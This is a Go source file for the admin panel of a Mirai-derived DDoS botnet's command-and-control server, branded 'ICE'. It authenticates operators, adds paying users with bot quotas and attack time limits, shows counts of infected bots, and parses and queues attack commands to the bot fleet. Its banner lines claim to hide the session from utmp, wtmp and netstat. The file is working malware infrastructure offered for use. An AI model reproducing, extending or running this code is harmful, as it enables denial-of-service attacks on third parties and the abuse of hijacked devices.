package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "strconv"
)

type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()

    this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.SetDeadline(time.Now().Add(60 * time.Second))
	this.conn.Write([]byte("\033[90m[\033[36mICE Mirai Botnet By Sxpreme\033[90m] \r\n"))
	this.conn.Write([]byte("\033[90m[\033[36mICE/SNOW CNC MADE BY BRIGHT\033[90m] \r\n"))
    this.conn.Write([]byte("\033[90mUsername\033[36m:\033[1;37m"))
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[90mPassword\033[36m:\033[1;37m"))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(350 * time.Second))
    this.conn.Write([]byte("\r\n"))
    spinBuf := []byte{'-', '\\', '|', '/'}
    for i := 0; i < 15; i++ {
        this.conn.Write(append([]byte("\r\033[90mHold up, verifying your login info... \033[90m"), spinBuf[i % len(spinBuf)]))
        time.Sleep(time.Duration(300) * time.Millisecond)
    }

    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
        this.conn.Write([]byte("\r\033[33;1mWrong info...\r\n"))
        this.conn.Write([]byte("\033[31mBye skid. (any key)\r\n"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }
    this.conn.Write([]byte("\r\n\033[0m"))
    this.conn.Write([]byte("\033[90m[+] DDOS \033[97m| \033[96mSuccesfully hijacked connection\r\n"))
    time.Sleep(250 * time.Millisecond)
    this.conn.Write([]byte("\033[90m[+] DDOS \033[97m| \033[96mMasking connection from utmp+wtmp...\r\n"))
    time.Sleep(500 * time.Millisecond)
    this.conn.Write([]byte("\033[90m[+] DDOS \033[97m| \033[96mHiding from netstat...\r\n"))
    time.Sleep(150 * time.Millisecond)
    this.conn.Write([]byte("\033[90m[+] DDOS \033[97m| \033[96mRemoving all traces of LD_PRELOAD...\r\n"))
    for i := 0; i < 4; i++ {
        time.Sleep(100 * time.Millisecond)
    }

    go func() {
        i := 0
        for {
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }

            time.Sleep(time.Second)
            	if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;Snow: %d \007", BotCount))); err != nil {
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()
	this.conn.Write([]byte("\033[2J\033[1H"))
	this.conn.Write([]byte("\033[97m                                                                             \r\n"))
	this.conn.Write([]byte("\033[97m                           ██\033[36m╗ \033[97m██████\033[36m╗\033[97m███████\033[36m╗\r\n"))
	this.conn.Write([]byte("\033[97m                           ██\033[36m║\033[97m██\033[36m╔════╝\033[97m██\033[36m╔════╝\r\n"))
	this.conn.Write([]byte("\033[97m                           ██\033[36m║\033[97m██\033[36m║     \033[97m█████\033[36m╗\r\n"))
	this.conn.Write([]byte("\033[97m                           ██\033[36m║\033[97m██\033[36m║     \033[97m██\033[36m╔══╝\r\n"))
	this.conn.Write([]byte("\033[97m                           ██\033[36m║╚\033[97m██████\033[36m╗\033[97m███████\033[36m╗\r\n"))
	this.conn.Write([]byte("\033[97m                           \033[36m╚═╝ ╚═════╝╚══════╝\r\n"))
	this.conn.Write([]byte("\033[36m		  \033[90m[\033[36m+\033[90m] \033[90mWelcome to the \033[36mICE \033[90mBotnet \033[90m[\033[36m+\033[90m]\r\n"))
	this.conn.Write([]byte("\033[97m                       Please type \033[36m'rules'                  \r\n"))
	
    for {
        var botCatagory string
        var botCount int
        this.conn.Write([]byte("\033[0;36mICE\033[01;37m > \033[0m"))
        cmd, err := this.ReadLine(false)
        
        if cmd == "clear" || cmd == "cls" || cmd == "c" {
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte("\033[97m                                                                             \r\n"))
    this.conn.Write([]byte("\033[97m                           ██\033[36m╗ \033[97m██████\033[36m╗\033[97m███████\033[36m╗\r\n"))
    this.conn.Write([]byte("\033[97m                           ██\033[36m║\033[97m██\033[36m╔════╝\033[97m██\033[36m╔════╝\r\n"))
    this.conn.Write([]byte("\033[97m                           ██\033[36m║\033[97m██\033[36m║     \033[97m█████\033[36m╗\r\n"))
    this.conn.Write([]byte("\033[97m                           ██\033[36m║\033[97m██\033[36m║     \033[97m██\033[36m╔══╝\r\n"))
    this.conn.Write([]byte("\033[97m                           ██\033[36m║╚\033[97m██████\033[36m╗\033[97m███████\033[36m╗\r\n"))
    this.conn.Write([]byte("\033[97m                           \033[36m╚═╝ ╚═════╝╚══════╝\r\n"))
    this.conn.Write([]byte("\033[36m                      \033[90m[\033[36m+\033[90m] \033[90mWelcome to the \033[36mICE \033[90mBotnet \033[90m[\033[36m+\033[90m]\r\n"))
    this.conn.Write([]byte("\033[36m                                                                                     \r\n"))
            continue
        }
        if err != nil || cmd == "exit" || cmd == "quit" {
            return
        }
        if err != nil || cmd == "rules" || cmd == "RULES" || cmd == "rls" {
            this.conn.Write([]byte("\033[36m[-------------------------------------------------------------------------]\r\n"))
            this.conn.Write([]byte("\033[97m |\033[97m                 Attacks longer than 300seconds = ban           | \r\n"))
            this.conn.Write([]byte("\033[97m |\033[97m                 More than 5 attacks an hour = ban              | \r\n"))
            this.conn.Write([]byte("\033[97m |\033[97m                 Spamming attacks = ban                         | \r\n"))            
            this.conn.Write([]byte("\033[97m |\033[97m                 Sharing login info = ban                       | \r\n"))
            this.conn.Write([]byte("\033[36m[-------------------------------------------------------------------------]\r\n"))
            continue
        }
        if cmd == "" {
            continue
        }

        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == "/add" {
            this.conn.Write([]byte("\033[1;36mUsername\033[1;36m \033[0;90m--> "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[1;36mPassword\033[1;36m \033[0;90m--> "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[1;36mBot Count \033[1;90m(\033[1;36m-\033[1;36m1 Access to All\033[1;90m)\033[0;90m--> "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[33;1m%s\033[0m\r\n", "\033[0;31mFailed to parse the bot count")))
                continue
            }
            this.conn.Write([]byte("\033[1;36mAttack Time \033[0;90m--> "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;36m%s\033[0m\r\n", "Failed to parse the attack duration limit")))
                continue
            }
            this.conn.Write([]byte("\033[1;36mCoolDown\033[0;90m-\033[1;36mTime \033[0;90m--> "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[33;1m%s\033[0m\r\n", "Failed to parse the cooldown")))
                continue
            }
            this.conn.Write([]byte("\033[1;36mUser Information\033[1;90m: \r\n\033[1;36mUsername\033[1;90m: " + new_un + "\r\n\033[1;36mPassword\033[1;90m: " + new_pw + "\r\n\033[1;36mBots\033[1;90m: " + max_bots_str + "\r\n\033[90mContinue to add user to \033[36mIce \033[1;90m? \033[0;90m(\033[1;36mY\033[0;90m/\033[0;31mN\033[0;90m)"))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateUser(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[33;1m%s\033[0m\r\n", "Failed to create new user. An unknown error occured.")))
            } else {
                this.conn.Write([]byte("\033[1;36mSuccessfully Added To \033[0;36mIce \033[1;90mBotnet \033[1;36mUSERNAME -> \033[0;90m" + new_un + " \033[1;90m-->PASSWORD -> \033[0;90m-->" + new_pw + "\033[0m\r\n"))
            }
            continue
        }

        if userInfo.admin == 1 && cmd == "bots" || cmd  == "/b" {

		botCount = clientList.Count()
            m := clientList.Distribution()
            for k, v := range m {
                this.conn.Write([]byte(fmt.Sprintf("\033[36m%s\033[37m:\033[90m\t<\033[36m%d\033[90m>\r\n", k, v)))
            }
            continue
		}
			 
		if userInfo.admin == 1 && cmd == "bots" || cmd  == "b" {
        botCount = clientList.Count()
            this.conn.Write([]byte(fmt.Sprintf("\033[1;90mTotal Bots\033[1;37m:\t%d\r\n", botCount)))
            continue
		} 

	    if cmd[0] == '-' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1mFailed to parse botcount \"%s\"\033[0m\r\n", count)))
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1mBot count to send is bigger then allowed bot maximum\033[0m\r\n")))
                continue
            }
            cmd = countSplit[1]
        }

        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                } else {
                    fmt.Println("Blocked attack by " + username + " to whitelisted prefix")
                }
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 1024)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\033' {
                buf[bufPos] = '^';
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++;
                buf[bufPos] = '[';
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}
